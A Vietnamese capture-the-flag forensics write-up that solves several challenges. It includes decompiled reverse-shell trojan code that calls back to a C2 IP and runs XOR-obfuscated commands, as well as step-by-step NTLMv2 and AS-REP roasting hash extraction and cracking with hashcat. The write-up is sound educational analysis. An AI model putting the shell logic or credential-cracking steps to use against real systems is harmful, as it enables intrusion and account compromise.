# qaStaH nuq
ở protocol http thì em có thấy

![image](https://hackmd.io/_uploads/r1GMO3DT-x.png)

decode thì được

![image](https://hackmd.io/_uploads/HysSdnDTZx.png)

**jctf{Attack_The_Enterprise}**

# Recover your Signal
bài này thì em thấy nó cho file log trong đó có đoạn mã

![image](https://hackmd.io/_uploads/BJViunDabl.png)

vì format flag là flag{} mà chữ iodj là nó lùi 3 chỉ số của ascii nên em dùng ROT3 để decode 

![image](https://hackmd.io/_uploads/Sk-XYnwTbg.png)

**flag{satellite_signal_decoded}**
# Spaceman 
Chạy zsteg thì em thu được

![image](https://hackmd.io/_uploads/Sypzi3va-x.png)

từ description của đề bài suy ra được dự án của nó là GEMINI 8 decode key gemini với cyberchef thì em thu được
**jctf{we_choose_to_go_to_the_moon}**
# Fix your ship
file đầu tiên thì em thấy chunk của nó là IHDR nên em recover 4 byte đầu theo ảnh png

![image](https://hackmd.io/_uploads/rJ9Dn3v6Zx.png)


![image](https://hackmd.io/_uploads/rJBKeaD6be.png)

file2 thì em thấy chunk là JFIF nên em recover theo magic bytes của ảnh jpg

![image](https://hackmd.io/_uploads/HJfah3v6We.png)


![image](https://hackmd.io/_uploads/ryc5xawabg.png)

trong cấu trúc của file mp4 `pfytisom / isomiso2avc1mp41` phần đầu tiên luôn là hộp `ftyp`  để khai báo định dạng nên em recover theo magicbytes của mp4 `66 74 79 70 69 73 6F 6D`

![image](https://hackmd.io/_uploads/SyEy-pw6-x.png)


![image](https://hackmd.io/_uploads/rkW0gTDabx.png)

**jctf{starship_voyager_apollo}**
# Cold Wake
chạy exiftool ở file 1 thì em thu được mảnh đầu tiên

![image](https://hackmd.io/_uploads/Syv_b6PpZl.png)

chạy stegseek ở 2 file còn lại thì em thu được 1 file mp3 và 1 file jpg

![image](https://hackmd.io/_uploads/BklW2-av6be.png)

mở file jpeg thì em thấy

![image](https://hackmd.io/_uploads/SJbkGavTWg.png)

còn file mp3 em mở lên nghe nó đọc thì thu được `19408`
**jctf{47291-80536-19408}**
# Concealed Surveilance
đọc description thì em thấy nó yêu cầu xác định thêm thông tin của người dùng phụ ngoài Tony

![image](https://hackmd.io/_uploads/SJ7YXTDpWl.png)

đầu tiên em sẽ trích SAM của nó ra

![image](https://hackmd.io/_uploads/BJXAm6vp-g.png)

Sau đó em tìm RID của user commodore64 kia

![image](https://hackmd.io/_uploads/S13U4pwa-x.png)

Em đối chiếu lên theo RID và thu được đoạn mã nằm trong giá trị V (Variable-length data) nơi lưu trữ thông tin Username, Full Name và Description.

![image](https://hackmd.io/_uploads/r1HqVpPTZx.png)

decrypt thì em thu được phần đầu của flag

![image](https://hackmd.io/_uploads/rySkSpDpbe.png)

Sau đó em kiểm tra trong artifact Powershell History thì thấy có 2 đoạn mã lạ 

![image](https://hackmd.io/_uploads/r197HTPTWx.png)


![image](https://hackmd.io/_uploads/BkZLSTDaZx.png)

decode thì em thu được

![image](https://hackmd.io/_uploads/H1g3HaPaZg.png)


![image](https://hackmd.io/_uploads/Hyw0S6Da-g.png)

cũng ở PS history thì em thấy nó thực thi file khả nghi

![image](https://hackmd.io/_uploads/HkUq8pwaWx.png)

tìm theo đường dẫn thì em thu được mảnh flag cuối cùng

![image](https://hackmd.io/_uploads/S1leGD6vTWl.png)


![image](https://hackmd.io/_uploads/rJa8wTw6bx.png)

**jctf{th3_commod0r3s_h@ve_inf1ltr@ted_!nt0_th3_apoll0!}**
# Neptune Authority 
em xem phần export của http thì em thấy 

![image](https://hackmd.io/_uploads/Hy5l_pvTbl.png)

em xem thì thấy có rất nhiều packet chứa note là oldorbit

![image](https://hackmd.io/_uploads/SJhd_pwa-e.png)

Em thấy Salted__ ở đầu file cho biết chúng được mã hóa bằng công cụ OpenSSL và em nghĩ cái note kia là passphrase 

![image](https://hackmd.io/_uploads/BkFbt6D6Ze.png)

em decrypt 2 file này

![image](https://hackmd.io/_uploads/HkDvKTva-g.png)

thì em thấy có 1 file private key 

![image](https://hackmd.io/_uploads/HyBFt6Dpbg.png)

với em thấy trong file pcap có các Encrypted Alert 

![image](https://hackmd.io/_uploads/BkV25aDaZe.png)

Em nghĩ nó dựa trên cơ chế **Trao đổi khóa RSA (RSA Key Exchange)**
- **Public Key:** Nằm trong file ods.crt. Khóa này được phân phát cho tất cả mọi người. Chức năng của nó là mã hóa.

- **Private Key:** Nằm trong file ods.key. Khóa này máy chủ phải giữ bí mật tuyệt đối. Chức năng của nó là giải mã những gì Public Key đã mã hóa.

Vì TLS chỉ là lớp vỏ mã hóa, dữ liệu bên trong nó có thể là bất kỳ giao thức nào và em thấy máy tính sử dụng công cụ `curl/7.76.1` để tải file từ máy chủ bằng lệnh `GET`. Điều này khẳng định ứng dụng đang chạy là một Web Server. Do đó, luồng dữ liệu bị mã hóa tiếp theo  chắc chắn cũng là giao tiếp web (HTTP). Sau đó em add key đó vào wireshark 

![image](https://hackmd.io/_uploads/ByIvp6wa-g.png)

Sau khi giải mã thì em follow theo tls stream và thu được

![image](https://hackmd.io/_uploads/H1Eo66vpbe.png)

**jctf{48173926}**
# file-transfer
Đầu tiên thì em thấy ở stream ở tcp khá lạ

![image](https://hackmd.io/_uploads/HJrHlRPaZx.png)

Em thấy các gói tin liên quan đến việc truyền tải tệp tin đều bị làm rối dưới dạng Encrypted SMB3 để có thể đọc được payload bên trong, hệ thống phân tích cần có "Session Key", và Session Key này được dẫn xuất từ mật khẩu thực tế của người dùng đã xác thực.

![image](https://hackmd.io/_uploads/S1OFeRD6Wg.png)

Em thấy gói tin ban đầu cho thấy quá trình xác thực sử dụng giao thức NTLMSSP (NT LAN Manager Security Support Provider). Cụ thể, đây là quá trình bắt tay Challenge/Response của NTLMv2.

![image](https://hackmd.io/_uploads/BJ5ieCv6We.png)

Em nghĩ bài này cần có Session key để giải mã các payload của protocol SMB đc mã hóa, để bẻ khóa mật khẩu cần phải trích xuất chính xác bộ tham số từ hai gói tin **NTLMSSP**:
- **Gói NTLMSSP_CHALLENGE (Type 2): Chứa Server Challenge** - một chuỗi ngẫu nhiên 8-byte do máy chủ tạo ra để thách thức client.
- **Gói NTLMSSP_AUTH (Type 3)**: Chứa NTProofStr và phần dữ liệu bổ sung (Blob) mà client gửi lại sau khi đã tính toán bằng mật khẩu của mình.
- **Cấu trúc hash của nó là: User::Domain:Challenge:NTProofStr:Blob**

Đầu tiên em lấy  mảnh **Challenge** của packet **ntlmssp_challenge** và thu được

![image](https://hackmd.io/_uploads/ByjUGCD6Zg.png)

Sau đó em thu 4 mảnh còn lại từ packet AUTH 

![image](https://hackmd.io/_uploads/rJaqf0wpZe.png)

Lưu ý: Blob sẽ nằm trong NTLMv2 Response nhưng - đi byte của NTProofStr ra

![image](https://hackmd.io/_uploads/r1Ohz0w6Ze.png)

Sau khi trích xuất thì em thu được file hash như vầy 

![image](https://hackmd.io/_uploads/SJMN7RDaWe.png)

Sau khi crack bằng hashcat thì em thu được password của nó là password =))

![image](https://hackmd.io/_uploads/rJitmAv6-l.png)

Sau đó em add password vào protocol ntlmssp

![image](https://hackmd.io/_uploads/By3C70vTWx.png)

Sau khi add xong thì em thấy trong phần export object của smb có chứa file exe lạ 

![image](https://hackmd.io/_uploads/S1GbE0PaWe.png)

Em có tra hash thì nó là con trojan =))

![image](https://hackmd.io/_uploads/Bkc4V0wT-e.png)

Sau đó em mở IDA lên để phân tích, em view strings thì thấy nó có chạy cmd.exe, em nghĩ đây là hành vi của một Reverse Shell hoặc công cụ Remote Command Execution (RCE) Trojan này được thiết kế để nhận một lệnh từ xa 

![image](https://hackmd.io/_uploads/r1yBrCPp-g.png)

Sau đó em thấy 1 địa chỉ IP, và fake flag ở dưới nma em kh compile code được của fake flag này nên em sẽ trace theo IP này 

![image](https://hackmd.io/_uploads/Sy9_8Rwabx.png)

Sau khi compile thì em thấy mã độc chủ động mở một socket TCP kết nối về IP 10.1.2.211 tại cổng 55544. Sau khi kết nối thành công, nó gửi một tín hiệu báo hiệu (ví dụ: CMD-SEQ-B) thông qua hàm sub_401000, ngay sau đó nó gọi hàm sub_401180 để chờ và xử lý lệnh từ C2 gửi tới. Cấu trúc lặp này xác nhận kịch bản C2 liên tục cấp phát lệnh tĩnh.
```
int sub_401300()
{
  int Error; // eax
  int v2; // eax
  int v3; // eax
  ADDRINFOA pHints; // [esp+0h] [ebp-3C8h] BYREF
  int len; // [esp+20h] [ebp-3A8h]
  PADDRINFOA ppResult; // [esp+24h] [ebp-3A4h] BYREF
  PADDRINFOA i; // [esp+28h] [ebp-3A0h]
  int v8; // [esp+2Ch] [ebp-39Ch]
  SOCKET s; // [esp+30h] [ebp-398h]
  WSAData WSAData; // [esp+34h] [ebp-394h] BYREF
  char buf[512]; // [esp+1C4h] [ebp-204h] BYREF

  s = -1;
  sub_403590(buf, 0, 512);
  len = 512;
  ppResult = 0;
  i = 0;
  v8 = WSAStartup(0x202u, &WSAData);
  if ( v8 )
  {
    sub_401740("WSAStartup failed with error: %d
", v8);
    return 1;
  }
  else
  {
    sub_403590(&pHints, 0, 32);
    pHints.ai_family = 0;
    pHints.ai_socktype = 1;
    pHints.ai_protocol = 6;
    v8 = getaddrinfo("10.1.2.211", "55544", &pHints, &ppResult);
    if ( v8 )
    {
      sub_401740("getaddrinfo failed with error: %d
", v8);
      WSACleanup();
      return 1;
    }
    else
    {
      for ( i = ppResult; i; i = i->ai_next )
      {
        s = socket(i->ai_family, i->ai_socktype, i->ai_protocol);
        if ( s == -1 )
        {
          Error = WSAGetLastError();
          sub_401740("socket failed with error: %ld
", Error);
          WSACleanup();
          return 1;
        }
        v8 = connect(s, i->ai_addr, i->ai_addrlen);
        if ( v8 != -1 )
          break;
        closesocket(s);
        s = -1;
      }
      freeaddrinfo(ppResult);
      if ( s == -1 )
      {
        sub_401740("Unable to connect to server!
");
        WSACleanup();
        return 1;
      }
      else if ( sub_401000(s, ::buf) )
      {
        return 1;
      }
      else if ( sub_401180(s) )
      {
        return 1;
      }
      else if ( sub_401000(s, aCmdSeqB) )
      {
        return 1;
      }
      else if ( sub_401180(s) )
      {
        return 1;
      }
      else if ( sub_401000(s, aCmdSeqC) )
      {
        return 1;
      }
      else if ( sub_401180(s) )
      {
        return 1;
      }
      else if ( sub_401000(s, aCmdSeqD) )
      {
        return 1;
      }
      else if ( sub_401180(s) )
      {
        return 1;
      }
      else
      {
        v8 = shutdown(s, 1);
        if ( v8 == -1 )
        {
          v2 = WSAGetLastError();
          sub_401740("shutdown failed with error: %d
", v2);
          closesocket(s);
          WSACleanup();
          return 1;
        }
        else
        {
          do
          {
            v8 = recv(s, buf, len, 0);
            if ( v8 <= 0 )
            {
              if ( v8 )
              {
                v3 = WSAGetLastError();
                sub_401740("recv failed with error: %d
", v3);
              }
              else
              {
                sub_401740("Connection closed
");
              }
            }
            else
            {
              sub_401740("Bytes received: %d
", v8);
            }
          }
          while ( v8 > 0 );
          closesocket(s);
          WSACleanup();
          return 0;
        }
      }
    }
  }
}
```
Đi sâu vào hàm `sub_401180`, mã độc gọi hàm recv để nhận buffer từ C2. Trước khi đưa buffer này vào thực thi, dữ liệu được truyền qua hàm `sub_4010F0`
```
int __cdecl sub_401180(SOCKET s)
{
  int Error; // eax
  char *lpMem; // [esp+4h] [ebp-214h]
  __m128i *v4; // [esp+8h] [ebp-210h]
  int v5; // [esp+Ch] [ebp-20Ch]
  int v6; // [esp+10h] [ebp-208h]
  __m128i buf; // [esp+14h] [ebp-204h] BYREF

  sub_403590(&buf, 0, 0x200u);
  v5 = 0;
  while ( 1 )
  {
    v6 = recv(s, &buf.m128i_i8[v5], 512 - v5, 0);
    if ( v6 <= 0 )
      break;
    sub_401740("Bytes received: %d
", v6);
    v5 = v6;
    v4 = (__m128i *)sub_401070(&buf, 512, &unk_4181F4, 3);
    if ( v4 )
      v6 = -1;
    if ( v6 <= 0 )
    {
      if ( v4 != &buf )
      {
        lpMem = (char *)sub_4010F0(&buf, (char *)v4 - (char *)&buf);
        sub_401740("command: %s
", lpMem);
        sub_405866(lpMem);
        sub_405730(lpMem);
      }
      return 0;
    }
  }
  if ( v6 )
  {
    Error = WSAGetLastError();
    sub_401740("recv failed with error: %d
", Error);
  }
  return -1;
}
```
Mã giả của hàm **sub_4010F0**: Thuật toán được sử dụng không phải là các chuẩn mã hóa phức tạp như AES hay RSA, mà là Rolling XOR (XOR xoay vòng).Ký tự thứ $i$ của ciphertext sẽ được XOR với ký tự thứ $(i \pmod{24})$ của một khóa tĩnh (Static Key).Truy xuất tham chiếu chéo  đến con trỏ mảng `aSorryImNotTheF` trong phân vùng bộ nhớ, chuỗi tĩnh được lưu trữ lộ ra nguyên văn: `sorry_im_not_the_flag_:)`.Chuỗi này có độ dài chính xác là 24 bytes, hoàn toàn khớp với `modulo % 24` trong vòng lặp.
Tính chất đối xứng của hàm XOR ($A \oplus B = C \implies C \oplus B = A$) cho phép sử dụng chính hàm mã hóa này để làm hàm giải mã. Kẻ tấn công đã áp dụng chung một routine cho cả việc giải mã lệnh nhận từ C2 và mã hóa Output của CMD trước khi gửi (Exfiltration) về lại C2.
```
int __cdecl sub_4010F0(int a1, unsigned int a2)
{
  int v3; // [esp+8h] [ebp-Ch]
  unsigned int i; // [esp+Ch] [ebp-8h]

  v3 = sub_405740(512);
  for ( i = 0; i < a2; ++i )
    *(_BYTE *)(i + v3) = aSorryImNotTheF[(int)i % 24] ^ *(_BYTE *)(i + a1);
  *(_BYTE *)(a2 + v3) = 0;
  return v3;
}
```
Tính chất đối xứng của hàm XOR ($A \oplus B = C \implies C \oplus B = A$) cho phép sử dụng chính hàm mã hóa này để làm hàm giải mã. Kẻ tấn công đã áp dụng chung một routine cho cả việc giải mã lệnh nhận từ C2 và mã hóa Output của CMD trước khi gửi (Exfiltration) về lại C2.

![image](https://hackmd.io/_uploads/SJOHO0vpZx.png)

Sau đó kẻ tấn công điều khiển máy nạn nhân thực thi lệnh như đã thấy ở luồng tcp hồi nãy 

![image](https://hackmd.io/_uploads/S1nouRwa-x.png)

Sau đó em lấy hex gốc của phản hồi của client đem đi xor với key là `sorry_im_not_the_flag_:)` 

![image](https://hackmd.io/_uploads/By1XYRPpWl.png)


![image](https://hackmd.io/_uploads/ByvXF0v6Zl.png)


![image](https://hackmd.io/_uploads/r1SVtRvpWe.png)

**jctf{Dah914znHQigIolS-j7xvL5XiYooM4Uce}**
# Galaga Archive
Bài này thì em thấy có 4 file trích xuất được từ smb

![image](https://hackmd.io/_uploads/SyZuc0PpZl.png)

Sau khi xem các file txt này thì em thấy author kêu cnay mã hóa bằng thuật toán XOR và key chính là hash sha256 của password tìm được 

![image](https://hackmd.io/_uploads/rkghqCDTbx.png)

Sau khi xem thì em thấy bài này có protocol kerberos khá lạ 

![image](https://hackmd.io/_uploads/Bkgkn0PpZl.png)

`Kerberos` là giao thức xác thực mạng mặc định và quan trọng nhất trong môi trường **Windows Active Directory (AD)** nó có 3 thành phần cốt lõi 
- **Client**: Người dùng hoặc máy tính muốn truy cập tài nguyên.
- **Server**: Dịch vụ hoặc tài nguyên mà Client muốn truy cập (ví dụ: File server chứa file cấu hình dự án Galaga).
- **KDC (Key Distribution Center)**: Trung tâm phân phối khóa, thường chính là máy chủ Domain Controller (DC). KDC là một bên thứ ba đáng tin cậy, nắm giữ mật khẩu của tất cả mọi người.

**Nguyên lý hoạt động cốt lõi (Hệ thống Ticketing)**:
Thay vì gửi mật khẩu trực tiếp qua mạng mỗi lần muốn truy cập một dịch vụ, Kerberos sử dụng hệ thống Tickets. 
**Quy trình xác thực chuẩn diễn ra theo các bước**:
- **AS-REQ (Authentication Service Request)**: Client gửi yêu cầu đến KDC xin cấp vé TGT (Ticket-Granting Ticket). Trong yêu cầu này, Client sẽ dùng mật khẩu của mình để mã hóa một Timestamp gửi kèm. Quá trình này gọi là Pre-Authentication.
- **AS-REP (Authentication Service Response)**: KDC nhận yêu cầu, dùng mật khẩu của Client (mà KDC đã lưu) để giải mã Timestamp. Nếu đúng, KDC chứng minh được Client thực sự biết mật khẩu. KDC sẽ trả về một vé TGT cho Client.
- **TGS-REQ & TGS-REP**: Client dùng vé TGT này để xin vé truy cập các dịch vụ cụ thể (Service Tickets).

Bài này liên quan tới lỗ hổng **AS-REP Roasting**: Trong bước 1 (AS-REQ) bước **Pre-Authentication** là bắt buộc.

Trong môi trường cấu hình **chuẩn**, luồng giao tiếp bắt buộc phải trải qua 4 bước:
- **AS-REQ (Lần 1)**: Client gửi yêu cầu cấp vé nhưng cố tình không gửi kèm mật khẩu (không có dữ liệu Pre-Auth).
- **KRB Error**: Server ngay lập tức từ chối và trả về một gói tin báo lỗi với nội dung: **KRB5KDC_ERR_PREAUTH_REQUIRED (Mã lỗi số 25)**. Điều này có nghĩa là: "Bạn phải chứng minh bạn biết mật khẩu trước khi tôi cấp vé".
- **AS-REQ (Lần 2)**: Client nhận được thông báo, gửi lại một gói AS-REQ thứ hai. Lần này, bên trong cấu trúc gói tin (phần padata) sẽ chứa một Timestamp đã được mã hóa bằng mật khẩu của người dùng.
- **AS-REP**: Server giải mã thử, thấy đúng mật khẩu nên trả về vé (AS-REP).

**Dấu hiệu**: cặp gói tin **AS-REQ -> KRB Error (25)** đi liền với nhau.

**Lỗ hổng AS-REP Roasting:**

- **AS-REQ**: Client gửi yêu cầu cấp vé, hoàn toàn không có dữ liệu chứng minh mật khẩu (không có padata hoặc PA-ENC-TIMESTAMP).

- **AS-REP**: Server không hề báo lỗi **KRB5KDC_ERR_PREAUTH_REQUIRED**. Thay vào đó, nó vui vẻ chấp nhận yêu cầu và lập tức trả về gói AS-REP chứa dữ liệu được mã hóa bằng mật khẩu của người dùng (**enc-part -> cipher**).

Dấu hiệu: Mở rộng nhánh `Kerberos -> as-req -> padata`, Nếu tính năng `Pre-Auth` bị tắt, sẽ không thấy trường **PA-ENC-TIMESTAMP (Type 2)** xuất hiện trong phần **padata** này nhưng Server vẫn phản hồi bằng một gói AS-REP hợp lệ.

Quay lại với wireshark thì em thấy user **galatic,tommy,bob** thỏa lỗ hổng trên nma sau khi làm thì em thấy chỉ crack đc password của user galatic th

![image](https://hackmd.io/_uploads/SyFSeyuaZl.png)

Hash của protocol này thỏa 
**$krb5asrep$23$<Username>@<Domain>:<32_ký_tự_Hex_đầu_tiên>$<Phần_Hex_còn_lại>**
Sau khi trích xuất thì hash của nó sẽ giống như 

![image](https://hackmd.io/_uploads/r1ZfQJ_pZl.png)

Sau khi hashcat thì em thu được password là galagalogz

![image](https://hackmd.io/_uploads/r1gOmkOTWe.png)


![image](https://hackmd.io/_uploads/SJuuQk_TZl.png)

Sau đó em tính sha256 của pass này thì thu được 

![image](https://hackmd.io/_uploads/SJajmy_aZg.png)

Sau đó em lấy đoạn kia ra và xor với key đó thì thu được

![image](https://hackmd.io/_uploads/rJu84JOp-x.png)

**jctf{roasted_galatic_invaders}**
